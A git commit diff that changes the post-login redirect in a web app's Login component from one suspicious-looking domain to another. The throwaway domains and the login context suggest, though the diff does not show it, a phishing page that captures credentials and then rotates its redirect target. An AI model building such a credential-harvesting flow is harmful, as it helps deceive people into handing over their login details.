9ffe8ca3112e208a707dd0f4ce685cfc317b517a
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-06-26 09:45:25 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://tbite.azuz-nutty.shop/';
+      window.location.href = 'https://tbonk.drodge-webview.online/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
